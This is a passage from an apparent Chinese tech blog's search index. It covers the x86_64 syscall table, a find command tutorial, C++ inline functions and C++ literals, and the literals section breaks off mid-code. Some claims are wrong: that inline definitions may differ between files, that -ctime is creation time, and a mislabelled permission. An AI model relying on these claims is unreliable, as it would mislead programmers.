align="center">320</td><td align="center">sys_kexec_file_load</td><td align="center">int kernel_fd</td><td align="center">int initrd_fd</td><td align="center">unsigned long cmdline_len</td><td align="center">const char __user *cmdline_ptr</td><td align="center">unsigned long flags</td><td align="center"></td></tr><tr><td align="center">321</td><td align="center">sys_bpf</td><td align="center">int cmd</td><td align="center">union bpf_attr *attr</td><td align="center">unsigned int size</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">322</td><td align="center">stub_execveat</td><td align="center">int dfd</td><td align="center">const char __user *filename</td><td align="center">const char __user *const __user *argv</td><td align="center">const char __user *const __user *envp</td><td align="center">int flags</td><td align="center"></td></tr><tr><td align="center">323</td><td align="center">userfaultfd</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">324</td><td align="center">membarrier</td><td align="center">int cmd</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">325</td><td align="center">mlock2</td><td align="center">unsigned long start</td><td align="center">size_t len</td><td align="center">int flags</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">326</td><td align="center">copy_file_range</td><td align="center">int fd_in</td><td align="center">loff_t __user *off_in</td><td align="center">int fd_out</td><td align="center">loff_t __user * off_out</td><td align="center">size_t len</td><td align="center">unsigned int flags</td></tr><tr><td align="center">327</td><td align="center">preadv2</td><td align="center">unsigned long fd</td><td align="center">const struct iovec __user *vec</td><td align="center">unsigned long vlen</td><td align="center">unsigned long pos_l</td><td align="center">unsigned long pos_h</td><td align="center">int flags</td></tr><tr><td align="center">328</td><td align="center">pwritev2</td><td align="center">unsigned long fd</td><td align="center">const struct iovec __user *vec</td><td align="center">unsigned long vlen</td><td align="center">unsigned long pos_l</td><td align="center">unsigned long pos_h</td><td align="center">int flags</td></tr><tr><td align="center">329</td><td align="center">pkey_mprotect</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">330</td><td align="center">pkey_alloc</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">331</td><td align="center">pkey_free</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">332</td><td align="center">statx</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">333</td><td align="center">io_pgetevents</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">334</td><td align="center">rseq</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">335</td><td align="center">pkey_mprotect</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><blockquote><p>本文转自 <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux find 命令超详解</title>
      <link href="/2021/10/18/linux-find/"/>
      <url>/2021/10/18/linux-find/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>find 命令的基本结构如下：<br><code>find [paths] [expression] [actions]</code></p><p>find 命令接受一个或多个<strong>路径</strong>（<em>paths</em>）作为搜索范围，并在该路径下<strong>递归</strong>地搜索。即检索完指定的目录后，还会对该目录下的子目录进行检索，以及子目录下的子目录。。。直到到达目录树底部。</p><p>默认情况下（不带任何搜索条件），find 命令会返回指定目录下的<strong>所有文件</strong>，所以常常需要通过特定的 <code>expression</code> 对结果进行<strong>筛选</strong>。</p><p>find 命令默认的 <code>action</code> 是将所有检索结果打印至标准输出。可以通过自定义 <code>action</code> ，让 find 命令对搜索到的结果执行特定的操作。</p><p>这里先不做详细解释，简单地测试下 find 命令：</p><p>1、有如下结构的示例目录 directory</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree directory</span></span><br><span class="line">directory</span><br><span class="line">├── file1</span><br><span class="line">├── file2</span><br><span class="line">├── sub-dir1</span><br><span class="line">│   ├── file1</span><br><span class="line">│   ├── file2</span><br><span class="line">│   └── file3</span><br><span class="line">└── sub-dir2</span><br><span class="line">    ├── file2</span><br><span class="line">    └── sub-subdir1</span><br><span class="line">        └── file1</span><br><span class="line"></span><br><span class="line">3 directories, 7 files</span><br></pre></td></tr></table></figure><p>2、默认的 find 命令会列出该目录下的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find directory</span></span><br><span class="line">directory</span><br><span class="line">directory/sub-dir1</span><br><span class="line">directory/sub-dir1/file3</span><br><span class="line">directory/sub-dir1/file2</span><br><span class="line">directory/sub-dir1/file1</span><br><span class="line">directory/file2</span><br><span class="line">directory/sub-dir2</span><br><span class="line">directory/sub-dir2/file2</span><br><span class="line">directory/sub-dir2/sub-subdir1</span><br><span class="line">directory/sub-dir2/sub-subdir1/file1</span><br><span class="line">directory/file1</span><br></pre></td></tr></table></figure><p>3、为 find 命令指定 expression 以筛选出特定的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find directory -name file2</span></span><br><span class="line">directory/sub-dir1/file2</span><br><span class="line">directory/file2</span><br><span class="line">directory/sub-dir2/file2</span><br></pre></td></tr></table></figure><p>4、为 find 命令指定特殊的 action（此处 <code>-delete</code> 表示删除搜索结果）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find directory -name file2 -delete</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> find directory</span></span><br><span class="line">directory</span><br><span class="line">directory/sub-dir1</span><br><span class="line">directory/sub-dir1/file3</span><br><span class="line">directory/sub-dir1/file1</span><br><span class="line">directory/sub-dir2</span><br><span class="line">directory/sub-dir2/sub-subdir1</span><br><span class="line">directory/sub-dir2/sub-subdir1/file1</span><br><span class="line">directory/file1</span><br></pre></td></tr></table></figure><hr><h1 id="搜索条件（expression）"><a href="#搜索条件（expression）" class="headerlink" title="搜索条件（expression）"></a>搜索条件（expression）</h1><h2 id="根据文件名检索"><a href="#根据文件名检索" class="headerlink" title="根据文件名检索"></a>根据文件名检索</h2><p>find 命令中的 <code>-name</code> 选项可以根据文件名称进行检索（<strong>区分大小写</strong>）。如需要忽略文件名中的大小写，可以使用 <code>-iname</code> 选项。</p><p><code>-name</code> 和 <code>-iname</code> 两个选项都支持 <strong>wildcards</strong> 。如：</p><ul><li><code>?</code> 可以表示任意一个单一的符号</li><li><code>*</code> 可以表示任意数量（包括 0）的未知符号</li></ul><p><code>find /usr -name &#39;*.txt&#39;</code> 查找 /usr 目录下所有文件名以 <code>.txt</code> 结尾的文件<br><code>find /usr -name &#39;????&#39;</code> 查找 /usr 目录下所有文件名刚好为 4 个字符的文件</p><p>有些时候，你需要在搜索时匹配某个文件或目录的<strong>完整路径</strong>，而不仅仅是匹配文件名。可以使用 <code>-path</code> 或 <code>-ipath</code> 选项。</p><p>如查找 /usr 下所有文件名以 <code>.txt</code> 结尾的文件或目录，且该文件的父目录必须是 <code>src</code>。可以使用以下命令：<br><code>find /usr -path &#39;*/src/*.txt&#39;</code></p><h2 id="根据文件类型检索"><a href="#根据文件类型检索" class="headerlink" title="根据文件类型检索"></a>根据文件类型检索</h2><p>如果只想搜索得到文件<strong>或</strong>目录，即不想它们同时出现在结果中。可以使用 <code>-type</code> 选项指定文件类型。</p><p><code>-type</code> 选项最常用的参数如下：</p><ul><li>f: 文件</li><li>d: 目录</li><li>l: 符号链接<br><code>find /usr -type d -name &#39;python*&#39;</code> 检索 /usr 下所有文件名以 <code>python</code> 开头的目录</li></ul><h2 id="检索空文件"><a href="#检索空文件" class="headerlink" title="检索空文件"></a>检索空文件</h2><p>find 命令支持 <code>-empty</code> 选项用来检索为空的文件或目录。空文件即文件里没有任何内容，空目录即目录中没有任何文件或子目录。</p><p><code>find ~ -type d -empty</code> 检索用户主目录下所有的空目录</p><h2 id="反义匹配"><a href="#反义匹配" class="headerlink" title="反义匹配"></a>反义匹配</h2><p>find 命令也允许用户对当前的匹配条件进行 <strong>“反义”</strong>（类似于逻辑非操作）。</p><p>如需要检索 /usr 下所有文件名<strong>不</strong>以 <code>.txt</code> 为后缀的文件。可以使用以下命令：<br><code>find /usr -type f ! -name &#39;*.txt&#39;</code></p><p>也可以“翻转”任何其他的筛选条件，如：<br><code>find /usr -type f ! -empty</code> 检索 /usr 下所有内容不为空的文件</p><h2 id="根据文件的所属权检索"><a href="#根据文件的所属权检索" class="headerlink" title="根据文件的所属权检索"></a>根据文件的所属权检索</h2><p>为了检索归属于特定用户的文件或目录，可以使用 <code>-user</code> 选项。</p><p><code>find / -type f -user starky</code> 检索根目录下所有属主为 starky 的文件</p><p>类似于 <code>-user</code> 选项，<code>-group</code> 选项则可以根据文件或目录的<strong>属组</strong>进行检索。</p><h2 id="根据时间日期进行检索"><a href="#根据时间日期进行检索" class="headerlink" title="根据时间日期进行检索"></a>根据时间日期进行检索</h2><p>有些时候，需要根据文件创建或修改的时间进行检索。</p><p>Linux 系统中，与文件相关联的时间参数有以下三种：</p><ul><li>修改时间（Modification time）：最后一次文件内容有过更改的时间点</li><li>访问时间（Access time）：最后一次文件有被读取过的时间点</li><li>变更时间（Change time）：最后一次文件有被<strong>变更</strong>过的时间点（如内容被修改，或权限等 metadata 被修改）</li></ul><p>与此对应的是 find 命令中的 <code>-mtime</code>，<code>-atime</code> 和 <code>-ctime</code> 三个选项。</p><p>这三个选项的使用遵循以下示例中的规则：</p><ul><li><code>-mtime 2</code>：该文件 2 天前被修改过</li><li><code>-mtime -2</code>：该文件 2 天以内被修改过</li><li><code>-mtime +2</code>：该文件距离上次修改已经超过 2 天时间</li></ul><p><code>find /usr -type f -mtime 2</code> 检索 /usr 下两天前被修改过的文件</p><p>如果觉得 <code>-mtime</code> 等选项以天为单位时间有点长，还可以使用 <code>-mmin</code>，<code>-amin</code>，<code>-cmin</code> 三个选项：<br><code>find /usr -type f -mtime +50 -mtime -100</code> 检索 /usr 下 50 到 100 天之前修改过的文件<br><code>find /usr -type f -mtime 2 -amin 5</code> 检索 /usr 下两天前被修改过且 5 分钟前又读取过的文件</p><h2 id="根据文件大小检索"><a href="#根据文件大小检索" class="headerlink" title="根据文件大小检索"></a>根据文件大小检索</h2><p><code>-size</code> 选项允许用户通过文件大小进行搜索（只适用于文件，目录没有大小……）。</p><p>表示文件大小的单位由以下字符组成：</p><ul><li><code>c</code>：字节</li><li><code>k</code>：Kb</li><li><code>M</code>：Mb</li><li><code>G</code>：Gb</li></ul><p>另外，还可以使用 <code>+</code> 或 <code>-</code> 符号表示<strong>大于</strong>或<strong>小于</strong>当前条件。</p><p><code>find / -size +1G</code> 检索文件大小高于 1 GB 的文件</p><h2 id="根据文件权限检索"><a href="#根据文件权限检索" class="headerlink" title="根据文件权限检索"></a>根据文件权限检索</h2><p>find 命令可以使用 <code>-perm</code> 选项以文件权限为依据进行搜索。</p><p><strong>使用符号形式</strong></p><p>如需要检索 /usr 目录下权限为 <code>rwxr-xr-x</code> 的文件，可以使用以下命令：<br><code>find /usr -perm u=rwx,g=rx,o=rx</code></p><p>搜索 /usr 目录下所有权限为 <code>r-xr-xr-x</code>（即系统中的所有用户都只有读写权限）的文件和目录，可以使用以下命令：<br><code>find /usr -perm a=rx</code></p><p>很多时候，我们只想匹配文件权限的一个<strong>子集</strong>。比如，检索可以直接被任何用户执行的文件，即只关心文件的执行权限，而不用管其读写权限是什么。</p><p>上述的需求可以通过以下命令实现：<code>find / -type f -perm /a=x</code><br>其中 <code>a=x</code> 前面的 <code>/ </code> 符号即用来表示只匹配权限的某个子集（执行权限），而不用关心其他权限的具体设置。</p><p><strong>使用数字形式</strong></p><p><code>-perm</code> 选项也支持数字形式的文件权限标记。</p><p><code>find /usr -perm 644</code> 搜索 /usr 目录下权限为 <strong>644</strong>（即 <code>rw-r--r--</code>）的文件</p><h2 id="限制遍历的层数"><a href="#限制遍历的层数" class="headerlink" title="限制遍历的层数"></a>限制遍历的层数</h2><p>find 命令默认是以<strong>递归</strong>的方式检索项目的，这有时候会导致得到的结果数量非常巨大。可以使用 <code>-maxdepth</code> 限制 find 命令递归的层数。</p><p><code>find / -maxdepth 3</code> 搜索时向下递归的层数最大为 3</p><h2 id="逻辑组合"><a href="#逻辑组合" class="headerlink" title="逻辑组合"></a>逻辑组合</h2><p>在之前的例子中有出现多个搜索条件的组合以及对某个搜索条件的反转。<br>实际上 find 命令支持 <strong>“and”</strong> 和 <strong>“or”</strong> 两种逻辑运算，对应的命令选项分别是 <code>-a</code> 和 <code>-o</code>。通过这两个选项可以对搜索条件进行更复杂的组合。</p><p>此外还可以使用<strong>小括号</strong>对搜索条件进行<strong>分组</strong>。注意 <code>find</code> 命令中的小括号常需要用<strong>单引号</strong>包裹起来。因为小括号在 Shell 中有特殊的含义。</p><p>如检索 /usr 下文件名以 <code>python</code> 开头且类型为目录的文件<br><code>find /usr -type d -name &#39;python*&#39;</code></p><p>该命令等同于：<br><code>find /usr -type d -a -name &#39;python*&#39;</code></p><p>更复杂的组合形式如：<br><code>find / &#39;(&#39; -mmin -5 -o -mtime +50 &#39;)&#39; -a -type f</code></p><hr><h1 id="对搜索结果执行命令"><a href="#对搜索结果执行命令" class="headerlink" title="对搜索结果执行命令"></a>对搜索结果执行命令</h1><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p><code>-delete</code> 选项可以用来删除搜索到的文件和目录。</p><p>如删除 home 目录下所有的空目录：<br><code>find ~ -type d -empty -delete</code></p><h2 id="执行自定义命令"><a href="#执行自定义命令" class="headerlink" title="执行自定义命令"></a>执行自定义命令</h2><p><code>-exec</code> 选项可以对搜索到的结果执行特定的命令。</p><p>如需要将 home 目录下所有的 MP3 音频文件复制到移动存储设备（假设路径是 <code>/media/MyDrive</code>），可使用下面的命令：<br><code>find ~ -type f -name &#39;*.mp3&#39; -exec cp &#123;&#125; /media/MyDrive &#39;;&#39;</code></p><p>其中的<strong>大括号</strong>（<code>&#123;&#125;</code>）作为检索到的文件的<strong>占位符</strong> ，而分号（ <code>;</code>）作为命令结束的标志。因为分号是 Shell 中有特殊含义的符号，所以需要使用单引号括起来。<br>每当 find 命令检索到一个符合条件的文件，会使用其完整路径取代命令中的 <code>&#123;&#125;</code>，然后执行 <code>-exec</code> 后面的命令一次。</p><p>另一个很重要的用法是，在多个文件中检索某个指定的字符串。<br>如在用户主目录下的所有文件中检索字符串 <code>hello</code> ，可以使用如下命令：<br><code>find ~ -type f -exec grep -l hello &#123;&#125; &#39;;&#39;</code></p><p><strong>-exec 选项中的 + 符号</strong></p><p>创建 Gzip 格式的压缩文件的命令为：<code>tar -czvf filename.tar.gz &lt;list of files&gt;</code></p><p>现在假设需要将用户主目录下所有的 MP3 文件添加到压缩包 <code>music.tar.gz</code> 中，直观的感觉是，其命令应为如下形式：<br><code>find ~ -type f -name &#39;*.mp3&#39; -exec tar -czvf music.tar.gz &#123;&#125; &#39;;&#39;</code></p><p>实际情况是，这样得到的 <code>music.tar.gz</code> 其实只包含一个 MP3 文件。<br>原因是 find 命令<strong>每次</strong>发现一个音频文件，都会再执行一次 <code>-exec</code> 选项后面的压缩命令。导致先前生成的压缩包被覆盖。</p><p>可以先让 find 命令检索出所有符合条件的音频文件，再将得到的<strong>文件列表</strong>传递给后面的压缩命令。完整的命令如下：<br><code>find ~ -type f -name &#39;*.mp3&#39; -exec tar -czvf music.tar.gz &#123;&#125; +</code></p><p><strong>显示文件信息</strong></p><p>如果想浏览搜索到的文件（目录）的详细信息（如权限和大小等），可以直接使用 <code>-ls</code> 选项。</p><p><code>find / -type file -size +1G -ls</code> 浏览所有 1G 以上大小的文件的详细信息。</p><hr><h1 id="常用参数汇总"><a href="#常用参数汇总" class="headerlink" title="常用参数汇总"></a>常用参数汇总</h1><table><thead><tr><th>参数</th><th>解析</th></tr></thead><tbody><tr><td>-atime n[<em>smhdw</em>]</td><td>距离文件上次被访问时的时间间隔</td></tr><tr><td>-ctime n[<em>smhdw</em>]</td><td>距离文件创建时的时间间隔</td></tr><tr><td>-delete</td><td>删除检索到的文件</td></tr><tr><td>-depth n</td><td>检索深度为 n 的文件，即位于指定目录以下 n 层的文件</td></tr><tr><td>-empty</td><td>检索空文件或空目录</td></tr><tr><td>-fstype <em>type</em></td><td>指定文件所在的文件系统的类型</td></tr><tr><td>-group <em>gname</em></td><td>指定文件的属组</td></tr><tr><td>-iname <em>pattern</em></td><td>同 <code>-name</code>，忽略大小写</td></tr><tr><td>-ipath <em>pattern</em></td><td>同 -path，忽略大小写</td></tr><tr><td>-ls</td><td>打印搜索到的文件的详细信息</td></tr><tr><td>-maxdepth <em>n</em></td><td>指定递归的最大层数为 n</td></tr><tr><td>-mtime n[<em>smhdw</em>]</td><td>距离文件上次发生变更时的时间间隔</td></tr><tr><td>-name pattern</td><td>搜索时使用 <code>pattern</code> 对文件名进行匹配</td></tr><tr><td>-path <em>pattern</em></td><td>搜索时使用 <code>pattern</code> 对文件路径进行匹配</td></tr><tr><td>-perm <em>mode</em></td><td>根据文件权限搜索</td></tr><tr><td>-size <em>n[ckMGTP</em>]</td><td>根据文件大小搜索</td></tr><tr><td>-type <em>t</em></td><td>根据文件类型搜索</td></tr><tr><td>-user <em>uname</em></td><td>指定文件的属主</td></tr></tbody></table><blockquote><p>本文转自 <a href="https://www.jianshu.com/p/ea8cc2248022">https://www.jianshu.com/p/ea8cc2248022</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么在 C++ 中 inline 函数要在头文件中定义</title>
      <link href="/2021/10/17/cpp-inline-defined-in-header/"/>
      <url>/2021/10/17/cpp-inline-defined-in-header/</url>
      
        <content type="html"><![CDATA[<p>先说结论：</p><ul><li><strong>inline</strong> 函数并不是必须定义在头文件中，但是一个好的工程习惯是将其定义在头文件中。</li><li><font color='red'><strong>（核心）</strong></font><strong>inline</strong> 函数在链接的时候仅仅在单个 <strong>cpp</strong> 文件中“可见”，并不是全局“可见”，其实是因为 <strong>inline</strong> 函数没有被编译成汇编码，无法用于链接。</li><li><strong>inline</strong> 函数仅仅是一个建议，对编译器的建议，最后能否真正内联，还要看编译器，并不是说声明了内联就会内联，声明内联只是一个建议而已。</li><li> C++ 中在类中实现的成员函数会被编译器自动默认判定为 <strong>inline</strong> 函数。</li></ul><hr><p>对于以下三个文件做测试：<br>test.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>test.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Test::func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;Hello, inline!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client1.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Test a;</span><br><span class="line">a.<span class="built_in">func</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将 <strong>Test</strong> 类中的 <strong>func</strong> 成员函数作为内联函数实现在 <strong>test.h</strong> 头文件所对应的 <strong>test.cpp</strong> 文件中，然后在 <strong>client1.cpp</strong> 中调用，用 GCC 编译的时候报链接错误如下：</p><div align=center><img src="linkerror.png" width = 65%></div><p><strong>链接器报错表示在 main 函数中调用的 func 函数是未定义的</strong>，由此可知内联函数与普通函数不同，其仅仅在本文件内可见，而不是全局可见的。如果将上述代码中 <strong>func</strong> 内联函数的定义写入到 <strong>test.h</strong> 头文件中，则可以正确的编译运行。</p><p>同时我们也可以得出结论，<strong>内联函数可以不在头文件中定义，但是在每个需要用到他的文件里面都需要对其定义，甚至可以有不同的定义，虽然这是行得通的，但是这好像违背了初衷，所以一般将内联函数的定义实现在头文件中</strong>。</p><p>由此我们可以回答以下问题：</p><blockquote><p>1、<strong>inline</strong> 函数和普通函数链接的区别？<br>普通函数是整个工程可见的，可以跨文件链接，而 <strong>inline</strong> 函数仅仅当前文件可见，不可以跨文件链接。</p><p>2、<strong>inline</strong> 函数的定义必须写在头文件中吗？<br>不必须。但是如果不写在头文件中，那么在每一个调用了 <strong>inline</strong> 函数的文件中都必须有该 <strong>inline</strong> 函数的定义，且每个文件中定义可以不同，相当于不同文件中的同名 <strong>inline</strong> 函数实际上不是同一个函数。</p><p>3、为什么类中定义的函数会被编译器自动判定为 <strong>inline</strong> 函数？<br>因为在工程中，类的定义通常写在某个头文件中，任何想要使用该类的源文件都需要先包括该头文件，如果在类中定义的函数不是 <strong>inline</strong> 函数，则有可能出现多重定义的问题。比如说有一个头文件定义了一个类，且该类中有一个实现在类里面的成员函数，工程中有两个源文件都包含了该头文件，那么经过预处理后，相当于在两个源文件中都有对该成员函数的定义，如果该成员函数没有被编译器判定为 <strong>inline</strong> 函数，则在链接的时候会出现多重定义的错误。</p><p>4、原理是什么？<br>因为 <strong>inline</strong> 函数在编译的时候就被插入到调用处，编译器不会单独为一个 <strong>inline</strong> 函数生成汇编代码，而是在调用的地方直接生成汇编代码插入到调用处，这个是属于编译阶段的事情而不是链接阶段的事情，所以在编译的代码生成阶段就需要拿到 <strong>inline</strong> 函数的定义。如果编译器在编译的代码生成阶段没有拿到 <strong>inline</strong> 函数的定义，则将对其的调用推迟到链接时，但是由于对于 <strong>inline</strong> 函数的定义处，编译器并未生成汇编代码，所以会链接失败。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 中的字面值常量</title>
      <link href="/2021/10/16/cpp-literal/"/>
      <url>/2021/10/16/cpp-literal/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个形如 20 的值称之为<strong>字面值常量（literal）</strong>，这样的值一望而知。每个字面值常量对应一种数据类型，由其<strong>形式和值</strong>决定。</p><hr><h1 id="整型字面值"><a href="#整型字面值" class="headerlink" title="整型字面值"></a>整型字面值</h1><p>整型字面值可以写成十进制数、八进制数、或者十六进制数的形式。例如，我们可以用以下任意一种形式来表示数值 20：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> decimal_literals = <span class="number">20</span>;          <span class="comment">//十进制</span></span><br><span class="line"><span class="keyword">int</span> octal_literals = <span class="number">024</span>;           <span class="comment">//八进制</span></span><br><span class="line"><span class="keyword">int</span> hexadecimal_literals = <span class="number">0x14</span>; <span class="comment">//十六进制</span></span><br></pre></td></tr></table></figure><p>默认情况下，十进制字面值的类型是 <code>int</code> 、<code>long</code> 和 <code>long long</code> 中能容纳其数值的最小者。而八进制和十六进制字面值的类型是能容纳其数值的 <code>int</code>、<code>unsigned int</code>、<code>long</code>、<code>unsigned long</code>、<code>long long</code> 和 <code>unsigned long long</code> 中的尺寸最小者。<strong>若一个字面值连与之关联的最大的数据类型都放不下，将产生错误。</strong><br>可以通过在常量后添加后缀来声明字面值常量的类型，添加后缀 <strong>u</strong> 或 <strong>U</strong> 表示为 <code>unsigned</code> ，添加后缀 <strong>l</strong> 或者 <strong>L</strong> 表示为 <code>long</code> 类型，添加后缀 <strong>ll</strong> 或者 <strong>LL</strong> 表示为 <code>long long</code> 类型，可以通过组合 <strong>ul</strong> 将常量声明为 <code>unsigned long</code> 型。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> unsigned_int = <span class="number">20u</span>;             <span class="comment">//无符号整型</span></span><br><span class="line"><span class="keyword">int</span> signed_long = <span class="number">20l</span>;    <span class="comment">//带符号长整型</span></span><br><span class="line"><span class="keyword">int</span> signed_long_long = <span class="number">20ll</span>;        <span class="comment">//带符号长长整型</span></span><br></pre></td></tr></table></figure><p>将上述两段代码用 clang 生成语法树如下：<br><img src="int_literal_1.jpeg"><br><img src="int_literal_2.jpeg"></p><hr><h1 id="浮点数字面值"><a href="#浮点数字面值" class="headerlink" title="浮点数字面值"></a>浮点数字面值</h1><p>默认情况下，浮点数字面值是一个 <code>double</code> 类型，表现为一个小数和科学计数法表示的指数，其中指数部分用 <strong>E</strong> 或 <strong>e</strong> 标识。可以通过在常量后添加后缀来声明浮点数字面值常量的类型，添加后缀 <strong>f</strong> 或 <strong>F</strong> 表示为 <code>float</code> ，添加后缀 <strong>l</strong> 或者 <strong>L</strong> 表示为 <code>long double</code> 类型。代码示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">float</span> v1 = <span class="number">3.14</span>;<span class="comment">//3.14是double类型</span></span><br><span class="line"><span class="keyword">float</span> v2 = <span class="number">3.14f</span>;<span class="comment">//3.14是float类型</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">double</span> v3 = <span class="number">3.14l</span>;<span class="comment">//3.14是long double类型</span></span><br></pre></td></tr></table></figure><p>clang 生成语法树如下：<br><img src="float_literal_1.jpeg"></p><hr><h1 id="字符和字符串字面值"><a href="#字符和字符串字面值" class="headerlink" title="字符和字符串字面值"></a>字符和字符串字面值</h1><p>由单引号括起来的一个字符称为 char 型字面值，双引号括起来的零个或多个字符则称为字符串型字面值。字符串字面值的类型实际上是由常量字符构成的数组，其类型为 <code>const char []</code>，<strong>在 ELF 文件中存放于 .rodata 段。</strong> 字符字面值或者字符串字面值通过添加前缀 <strong>L</strong> 表示为宽字符 <code>wcahr_t</code> ，通过添加前缀 <strong>u</strong> 和 <strong>U</strong> 可以分别表示为 Unicode16 字符 <code>char16_t</code> 和 Unicode32 字符 <code>char32_t</code>。特殊的，<font color='red'><strong>字符串字面值</strong></font>添加前缀 <strong>u8</strong> 可以表示为 UTF-8 字符串字面值。代码示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c1 = <span class="string">&#x27;A&#x27;</span>;                      <span class="comment">//char型常量</span></span><br><span class="line"><span class="keyword">wchar_t</span> c2 = <span class="string">L&#x27;A&#x27;</span>;                  <span class="comment">//宽字符型常量</span></span><br><span class="line"><span 